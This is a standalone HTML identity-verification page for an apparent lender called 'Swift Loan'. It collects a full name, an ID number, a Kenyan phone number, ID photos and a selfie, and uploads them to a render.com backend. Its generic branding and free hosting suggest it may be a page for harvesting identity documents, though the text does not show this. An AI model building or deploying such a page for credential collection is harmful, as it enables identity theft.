<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Identity Verification - Swift Loan</title>
  <style>
    body{font-family:Arial,Helvetica,sans-serif;background:#f4f6fb;padding:20px;display:flex;justify-content:center}
    .card{background:#fff;padding:22px;border-radius:14px;width:100%;max-width:420px;box-shadow:0 6px 20px rgba(0,0,0,0.06)}
    h2{text-align:center;margin-top:0}
    label{display:block;margin-top:12px;font-weight:600}
    input[type="text"], input[type="tel"], input[type="file"]{width:100%;margin-top:6px;padding:8px;border-radius:8px;border:1px solid #ddd}
    .preview{margin-top:8px}
    .preview img{width:100%;max-height:220px;object-fit:cover;border-radius:8px}
    .btn{margin-top:16px;background:#0069ff;color:#fff;padding:12px;border-radius:10px;border:none;cursor:pointer;width:100%;font-weight:700}
    .btn:disabled{opacity:0.6;cursor:default}
    .small{font-size:13px;color:#666;margin-top:8px}
    .spinner {
      display:inline-block;width:48px;height:48px;border-radius:50%;
      border:4px dashed #ccc;border-top-color:#2e7dff; animation:spin 1s linear infinite;
      margin:20px auto; visibility:hidden;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .show { visibility: visible; }
    .success { color: green; font-weight:700; text-align:center; margin-top:10px }
    .error { color: #c00; text-align:center; margin-top:10px }
  </style>
</head>
<body>
  <div class="card">
    <h2>Verify Your Identity</h2>

    <form id="form">
      <label>Your name as per ID (full name) *</label>
      <input id="name" name="name" type="text" required placeholder="Full name as on ID" />

      <label>Your ID number (8 or 9 digits) *</label>
      <input id="idNumber" name="idNumber" type="text" required placeholder="e.g. 12345678" />

      <label>Phone used to apply for loan (2547XXXXXXXX) *</label>
      <input id="phone" name="phone" type="tel" required placeholder="2547XXXXXXXX" />

      <label>Front of ID (preview below) *</label>
      <input id="frontID" name="frontID" type="file" accept="image/*" required />
      <div id="frontPreview" class="preview"></div>

      <label>Back of ID *</label>
      <input id="backID" name="backID" type="file" accept="image/*" required />
      <div id="backPreview" class="preview"></div>

      <label>Selfie (must be very clear) *</label>
      <input id="selfie" name="selfie" type="file" accept="image/*" required />
      <div id="selfiePreview" class="preview"></div>

      <button id="submitBtn" class="btn" type="submit">Upload Photos</button>

      <div id="loader" class="spinner" aria-hidden="true"></div>

      <div id="msg"></div>
      <p class="small">By submitting you authorize Swift Loan to verify your identity.</p>
    </form>
  </div>

  <script>
    const frontendUploadUrl = "https://identity-verification-backend.onrender.com/upload";

    const form = document.getElementById("form");
    const nameInput = document.getElementById("name");
    const idInput = document.getElementById("idNumber");
    const phoneInput = document.getElementById("phone");
    const selfieInput = document.getElementById("selfie");
    const frontInput = document.getElementById("frontID");
    const backInput = document.getElementById("backID");
    const submitBtn = document.getElementById("submitBtn");
    const loader = document.getElementById("loader");
    const msg = document.getElementById("msg");

    const selfiePreview = document.getElementById("selfiePreview");
    const frontPreview = document.getElementById("frontPreview");
    const backPreview = document.getElementById("backPreview");

    // preview helper
    function previewFile(input, container) {
      container.innerHTML = "";
      const file = input.files[0];
      if (!file) return;
      const img = document.createElement("img");
      img.src = URL.createObjectURL(file);
      img.onload = () => URL.revokeObjectURL(img.src);
      container.appendChild(img);
    }

    selfieInput.addEventListener("change", () => previewFile(selfieInput, selfiePreview));
    frontInput.addEventListener("change", () => previewFile(frontInput, frontPreview));
    backInput.addEventListener("change", () => previewFile(backInput, backPreview));

    // form validation functions
    function validateName(v) {
      return typeof v === "string" && v.trim().length >= 2;
    }
    function validateID(v) {
      return /^\d{8,9}$/.test(v);
    }
    function validatePhone(v) {
      return /^2547\d{8}$/.test(v);
    }

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      msg.innerHTML = "";

      const name = nameInput.value.trim();
      const idNumber = idInput.value.trim();
      const phone = phoneInput.value.trim();

      if (!validateName(name)) return showError("Please enter your full name as on ID.");
      if (!validateID(idNumber)) return showError("ID number must be 8 or 9 digits.");
      if (!validatePhone(phone)) return showError("Phone must be in 2547XXXXXXXX format.");

      if (!selfieInput.files[0] || !frontInput.files[0] || !backInput.files[0]) {
        return showError("All three images are required.");
      }

      // Optional client-side selfie clarity check: ensure file size > 10KB (very small heuristic)
      if (selfieInput.files[0].size < 10240) {
        return showError("Selfie file looks too small — please upload a clear selfie.");
      }

      // All validations passed - prepare upload
      const fd = new FormData();
      fd.append("name", name);
      fd.append("idNumber", idNumber);
      fd.append("phone", phone);
      fd.append("selfie", selfieInput.files[0]);
      fd.append("frontID", frontInput.files[0]);
      fd.append("backID", backInput.files[0]);

      // UI: show spinner and disable button
      submitBtn.disabled = true;
      loader.classList.add("show");
      msg.innerHTML = "";

      try {
        const resp = await fetch(frontendUploadUrl, { method: "POST", body: fd });
        const data = await resp.json();

        if (data && data.success) {
          // Successful submission - show friendly success message (no links shown to users)
          msg.innerHTML = '<div class="success">✅ Your photos have been submitted successfully. Our verification team will review them shortly.</div>';
          // Clear previews and inputs if you like (keeps form for another upload)
          selfieInput.value = "";
          frontInput.value = "";
          backInput.value = "";
          selfiePreview.innerHTML = "";
          frontPreview.innerHTML = "";
          backPreview.innerHTML = "";
        } else {
          showError((data && data.message) || "Upload failed. Try again.");
        }
      } catch (err) {
        console.error(err);
        showError("Network error while uploading. Please try again.");
      } finally {
        submitBtn.disabled = false;
        loader.classList.remove("show");
      }
    });

    function showError(text) {
      msg.innerHTML = '<div class="error">❌ ' + text + "</div>";
    }
  </script>
</body>
</html>
